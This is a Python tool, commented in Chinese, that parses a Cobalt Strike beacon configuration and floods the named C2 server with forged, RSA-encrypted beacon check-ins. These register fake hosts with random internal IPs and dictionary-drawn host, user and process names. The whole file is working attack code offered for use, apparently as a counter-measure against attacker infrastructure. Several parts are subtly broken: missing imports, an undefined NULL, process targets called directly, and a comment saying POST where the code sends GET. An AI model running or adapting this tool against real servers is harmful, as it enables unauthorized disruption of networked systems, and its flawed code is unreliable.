#!/usr/bin/env python3
import re
import platform
from tool.parse_beacon_config import *
import base64
import random
import rsa
import requests
import multiprocessing

# 未经魔改CS版本假上线
# IP整数bytearray再反转
def goOnline_1(url, computer_name, user_name, process_name, pubkey, UserAgent):
    # 随机数作为AES Key
    aes_key = bytearray(random.getrandbits(4) for _ in range(16))
    # 将 AESKEY 添加到 pack 中
    pack = aes_key
    # 添加其他数据
    pack += b'\xa8\x03' # name charset  (int) (little)
    pack += b'\xa8\x03' # name charset  (int) (little)
    pack += random.randint(0, 9999999).to_bytes(4, 'big') # Beacon Id
    pack += random.randint(0, 65535).to_bytes(4, 'big') # Beacon Pid
    pack += b'\x00\x00' # Beacon Port
    pack += b'\x04'  # Beacon Flag 04
    pack += b'\x06'
    pack += b'\x02'
    pack += b'\x23\xf0\x00\x00\x00\x00'  # windows version (int)
    pack += b'\x76\x91'  # windows version_1 (int)
    pack += b'\x0a\x60\x76\x90\xf5\x50'

    fistList = ['172','192','10']
    randomIndex = random.randint(0,2)
    if fistList[randomIndex] == "172":
        tempIpData= '172.' + str(random.randint(16,24)) + '.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255))
    if fistList[randomIndex] == "192":
        tempIpData= '192.168.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255))
    if fistList[randomIndex] == "10":
        tempIpData= '10.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255))
    pack +=  bytearray([int(i) for i in tempIpData.split('.')[::-1]])

    # 将计算机名、用户名、进程名添加到 pack 中
    computer_name_bytes = bytes(computer_name.encode('utf-8')) + b'\x09'
    user_name_bytes = bytes(user_name.encode('utf-8')) + b'\x09'
    process_name_bytes = bytes(process_name.encode('utf-8'))
    pack += computer_name_bytes + user_name_bytes + process_name_bytes
    # 添加 pack 的长度和其他头信息
    pack = b'\x00\x00\xBE\xEF' + len(pack).to_bytes(4, 'big') + pack
    # 使用公钥加密 pack，并使用 base64 编码
    pem_prefix = '-----BEGIN PUBLIC KEY-----\n'
    pem_suffix = '\n-----END PUBLIC KEY-----'
    key = '{}{}{}'.format(pem_prefix,pubkey,pem_suffix)
    pubkey = rsa.PublicKey.load_pkcs1_openssl_pem(key)
    try:
        enpack = rsa.encrypt(pack, pubkey)
        enpack_b64 = base64.b64encode(enpack).decode('utf-8')
        # 构造请求头，并发送 POST 请求
        headers = {
            'User-Agent':UserAgent,
            'Cookie': enpack_b64,
            'Accept': '*/*',
            'Connection': 'Keep-Alive',
            'Cache-Control': 'no-cache'
        }
        req = requests.get(url, headers=headers)
        if req.status_code == 200:
            print(f"\033[32m[o] IP:[{tempIpData+' '*(15-len(tempIpData))}]，主机名:[{computer_name+' '*(15-len(computer_name))}]，用户名:[{user_name+' '*(10-len(user_name))}], 进程名:[{process_name+' '*(13-len(process_name))}]  已上线\033[0m")
        else:
            print(f"\033[31m[x] Error-Code   : {req.status_code}\033[0m")
            print(f"\033[31m[x] Error-headers: {req.headers}\033[0m")
            print(f"\033[31m[x] Error-text   : {req.text if req.text else 'NULL'}\033[0m")
    except Exception as e:
        if( "but there is only space for 117" in str(e)):
            print(f"\033[31m[x] Error: 加密字段过长，加密失败，请检查传入变量字段长度")
        else:
            print(f"\033[31m[x] Error: {str(e)}")

# 常见魔改CS版本假上线
def goOnline_2(url, computer_name, user_name, process_name, pubkey, UserAgent):
    # 随机数作为AES Key
    aes_key = bytearray(random.getrandbits(4) for _ in range(16))
    # 将 AESKEY 添加到 pack 中
    pack = aes_key
    # 添加其他数据
    pack += b'\xa8\x03' # name charset  (int) (little)
    pack += b'\xa8\x03' # name charset  (int) (little)
    pack += random.randint(0, 9999999).to_bytes(4, 'big') # Beacon Id
    pack += random.randint(0, 65535).to_bytes(4, 'big') # Beacon Pid
    pack += b'\x00\x00' # Beacon Port
    pack += b'\x0e\x36\x32\x09'
    fistList = ['172','192','10']
    randomIndex = random.randint(0,2)
    if fistList[randomIndex] == "172":
        tempIpData= fistList[randomIndex] + '.' + str(random.randint(16,24)) + '.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255))
    if fistList[randomIndex] == "192":
        tempIpData= fistList[randomIndex] + '.168.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255))
    if fistList[randomIndex] == "10":
        tempIpData= fistList[randomIndex] + '.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255))
    pack += bytearray(tempIpData.encode('utf-8'))
    pack += b"\x09"

    # 将计算机名、用户名、进程名添加到 pack 中
    computer_name_bytes = bytes(computer_name.encode('utf-8')) + b'\x09'
    user_name_bytes = bytes(user_name.encode('utf-8')) + b'\x09'
    process_name_bytes = bytes(process_name.encode('utf-8'))
    pack += computer_name_bytes + user_name_bytes + process_name_bytes
    # 添加 pack 的长度和其他头信息
    pack = b'\x00\x00\xBE\xEF' + len(pack).to_bytes(4, 'big') + pack
    # 使用公钥加密 pack，并使用 base64 编码
    pem_prefix = '-----BEGIN PUBLIC KEY-----\n'
    pem_suffix = '\n-----END PUBLIC KEY-----'
    key = '{}{}{}'.format(pem_prefix,pubkey,pem_suffix)
    pubkey = rsa.PublicKey.load_pkcs1_openssl_pem(key)
    try:
        enpack = rsa.encrypt(pack, pubkey)
        enpack_b64 = base64.b64encode(enpack).decode('utf-8')
        # 构造请求头，并发送 POST 请求
        headers = {
            'User-Agent':UserAgent,
            'Cookie': 'SESSIONID='+enpack_b64,
            'Accept': '*/*',
            'Connection': 'Keep-Alive',
            'Cache-Control': 'no-cache'
        }
        req = requests.get(url, headers=headers)
        if req.status_code == 200:
            print(f"\033[32m[o] IP:[{tempIpData+' '*(15-len(tempIpData))}]，主机名:[{computer_name+' '*(15-len(computer_name))}]，用户名:[{user_name+' '*(10-len(user_name))}], 进程名:[{process_name+' '*(13-len(process_name))}]  已上线\033[0m")
        else:
            print(f"\033[31m[x] Error-Code   : {req.status_code}\033[0m")
            print(f"\033[31m[x] Error-headers: {req.headers}\033[0m")
            print(f"\033[31m[x] Error-text   : {req.text if req.text else 'NULL'}\033[0m")
    except Exception as e:
        if( "but there is only space for 117" in str(e)):
            print(f"\033[31m[x] Error: 加密字段过长，加密失败，请检查传入变量字段长度")
        else:
            print(f"\033[31m[x] Error: {str(e)}")

def initData():
    parser = argparse.ArgumentParser(description="fake online information for CS.")
    parser.add_argument("-f", "--file", dest="filename", type=str, required=True, help="CsBeacon木马文件路径/CsBeaconUrl【支持URL哦】")
    parser.add_argument("-n", "--number", dest="number", type=int, required=True, help="上线虚假主机个数")
    parser.add_argument("-c", "--computer", dest="computer_name_dic", type=str, default="./dic/computer_name_dic.txt", help="电脑名字典路径【默认自带字典】")
    parser.add_argument("-u", "--user", dest="user_name_dic", type=str, default="./dic/user_name_dic.txt", help="用户名字典路径【默认自带字典】")
    parser.add_argument("-p", "--process", dest="process_name_dic", type=str, default="./dic/process_name_dic.txt", help="线程名字典路径【默认自带字典】")
    args = parser.parse_args()
    return args.filename, args.number, args.computer_name_dic, args.user_name_dic, args.process_name_dic

def main():
    beaconFileOrUrl, number, computer_name_dic, user_name_dic, process_name_dic = initData()

    csBeacon=json.loads(json.dumps(csBeaconParse( beaconFileOrUrl ,True,False,0), cls=Base64Encoder))
    print(f"\033[32m[o] ---------------解析beacon设置信息---------------\033[0m\n{csBeacon}\n")

    # 提取基本数据进行拼接
    BeaconType = 'https://' if csBeacon['BeaconType'][0]=='HTTPS' else 'http://'
    UserAgent = csBeacon['UserAgent']
    Port = csBeacon['Port']
    C2Server = csBeacon['C2Server']
    HttpPostUri = csBeacon['HttpPostUri']
    url = BeaconType + C2Server.replace(',',f':{Port}')# + HttpPostUri

    Metadata = csBeacon['HttpGet_Metadata']['Metadata']

    # 数据格式化，并打印
    regex = re.compile(r"A+==")
    PublicKey = regex.sub('',csBeacon["PublicKey"])
    PublicKey = PublicKey if len(PublicKey)%4==0 else PublicKey+"A==" if len(PublicKey)%4==1 else PublicKey+"==" if len(PublicKey)%4==2 else PublicKey+"="
    print(f"\033[32m[o] ------------------提取格式化数据------------------")
    print(f"\033[32m[o] 【PublicKey】:\033[0m {PublicKey}")
    print(f"\033[32m[o] 【   Url   】:\033[0m {url}")
    print(f"\033[32m[o] 【UserAgent】:\033[0m {UserAgent}")
    print(f"\033[32m[o] --------------------------------------------------\n")

    multiprocessing.set_start_method('fork') if "macos" in platform.platform().lower() else NULL

    for _ in range(number):
        computer_name = random.choice(list(open(computer_name_dic))).strip()
        user_name = random.choice(list(open(user_name_dic))).strip()
        process_name = random.choice(list(open(process_name_dic))).strip()
        if 'SESSIONID=' not in str(Metadata):   # 魔改CS特征
            t = multiprocessing.Process(target=goOnline_1(url, computer_name, user_name, process_name,PublicKey,UserAgent))
        else:
            t = multiprocessing.Process(target=goOnline_2(url, computer_name, user_name, process_name,PublicKey,UserAgent))
        t.start()

if __name__ == "__main__":
    main()